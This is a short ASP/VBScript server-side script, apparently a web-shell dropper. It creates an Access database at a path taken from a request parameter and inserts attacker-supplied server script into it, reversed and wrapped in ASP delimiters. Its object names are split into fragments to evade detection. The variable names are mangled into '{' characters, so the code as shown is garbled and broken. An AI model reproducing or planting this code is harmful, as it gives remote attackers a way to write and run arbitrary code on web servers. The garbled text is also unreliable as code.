
<%On Error Resume Next
{1 = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=
" & Replace(Server.MapPath(Request("p1565pe51")), ".\", "~1\")
set {a = Server.Createobject("ad"&"ox"&"."&"cata"&"log")
{a.create {1
Set { = Server.Createobject("ad"&"odb"&"."&"conne"&"ction")
{.open {1
Set {s=server.createobject("ad"&"odb.rec"&"ord"&"set")
{s.Open "create table t1(a text)", {, 1, 1
{s.Open "insert into t1(a) values ('<"&Chr("3"&"7") & 
StrReverse(Request("p1565pe53")) 
& Chr("3"&"7") & ">')", {, 1, 1%>

